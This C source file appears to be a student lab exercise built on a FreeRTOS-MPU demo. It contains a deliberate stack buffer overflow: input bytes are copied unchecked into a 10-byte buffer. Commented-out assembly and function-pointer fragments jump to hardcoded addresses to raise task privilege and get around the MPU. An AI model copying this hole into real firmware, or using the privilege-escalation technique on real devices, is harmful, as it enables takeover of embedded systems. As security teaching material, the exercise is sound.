/*
 * FreeRTOS V202012.00
 * Copyright (C) 2020 Amazon.com, Inc. or its affiliates.  All Rights Reserved.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the "Software"), to deal in
 * the Software without restriction, including without limitation the rights to
 * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
 * the Software, and to permit persons to whom the Software is furnished to do so,
 * subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 * http://www.FreeRTOS.org
 * http://aws.amazon.com/freertos
 *
 * 1 tab == 4 spaces!
 */


/*
 * This file demonstrates the use of FreeRTOS-MPU.  It creates tasks in both
 * User mode and Privileged mode, and using both the xTaskCreate() and
 * xTaskCreateRestricted() API functions.  The purpose of each created task is
 * documented in the comments above the task function prototype (in this file),
 * with the task behaviour demonstrated and documented within the task function
 * itself.
 *
 * In addition a queue is used to demonstrate passing data between
 * protected/restricted tasks as well as passing data between an interrupt and
 * a protected/restricted task.  A software timer is also used.
 */

/* Standard includes. */
#include "string.h"
#include <stdio.h>
#include "task3a.h"

/* ----- xba begin ----- */
#include "RTE_Components.h"
#include CMSIS_device_header
/* ----- xba  end  ----- */
/*
void helper(int j, int len, char shellcode[8], char vlen[4],char length[2],char Buffer[12])
{
	len = 0;
	j = 0;
	shellcode[0] = 0x00;
	vlen[0] = 0x00;
	length[0] = 0x00;
	Buffer[len] = 0x45;
	Buffer[len + 1] = 0x33;
	Buffer[len + 2] = 0x00;
	Buffer[len + 3] = 0x00;
}*/

char inputBuf[100];
int length, temp;

int helper() {
	char helperStr[10];
	helperStr[0] = 'X';
	helperStr[1] = 'u';
	helperStr[2] = 'B';
	helperStr[3] = 'i';
	helperStr[4] = 'a';
	helperStr[5] = 'n';
	helperStr[6] = 'g';
	return 'x';
}

void Function(char helperBuf[10]) {
	/*
	__ASM(
		"MOV r3, #0x00004699\n"     // vTaskRemove
		"PUSH {r3}\n"
		"MOV r3, #0x00000000\n"     // xRunningPrivileged
		"PUSH {r3}\n"
		"MOV r3, #0x0000344f\n"		// vPortRaisePeivilege
		"PUSH {r3}\n"
		"MOV r3, #0x00000000\n"     // R7
		"PUSH {r3}\n"
	);
	*/
	
	for (int i = 0; i < length; i++) {
		helperBuf[i] = inputBuf[i];
	}
	helper();
}

void vTask3( void * pvParameters ) {	
	( void ) pvParameters; /* Unused parameters. */
	
	/* write your malicious code here
	
 
   
	
	*/
	char helperBuf[10];
	Function(helperBuf);
	

	//char shellcode[8];
	//char vlen[4];
	//char length[2];
	//char Buffer[12];
	//int len = 0;
	//int j = 0;
	//helper(j, len, shellcode, vlen, length,Buffer);
	
	// BaseType_t xRunningPrivileged = xPortRaisePrivilege();
	// xPortRaisePrivilege();
	// vTaskRemove();
	// MPU_vTaskRemove();
	// vPortResetPrivilege( xRunningPrivileged );
	
	/*
	__ASM(
		"MOV r3, #0x00004651\n"
		"PUSH {r3}\n"
		"MOV r3, #0x00000000\n"
		"PUSH {r3}\n"
		"MOV r3, #0x00003407\n"
		"BX r3\n"
	);
	*/
	
	//long xRunningPrivilege = xPortRaisePrivilege();
	// printf("test");
	//ARM_MPU_Disable();
	//vTaskRemove();
	//vPortResetPrivilege(xRunningPrivilege);
	
	
	// ARM_MPU_Disable();
	// vTaskRemove();
	/*
	long (*pRaise)();
	pRaise = (long(*)())0x0000340b;
	pRaise();
	
	long (*pRemove)();
	pRemove = (long(*)())0x00004655;
	pRemove();*/
	
	printf("Attack successful!\n");
	
	
	for( ; ; )
	{
	}
}

int main( void )
{
	uint32_t id = 1803; //input your last 4-digital id
	prvSetupHardware();
	
	printf("start\n");
	scanf("%d", &length);
	printf("length get: %d\n", length);
	for (int i = 0; i < length; i++) {
		scanf("%x", &temp);
		inputBuf[i] = temp;
		printf("%x ", inputBuf[i]);
	}
	
	StartFreeRTOS(id, vTask3);

	/* Will only get here if there was insufficient memory to create the idle
	task. */
	for( ;; );
}
/*-----------------------------------------------------------*/








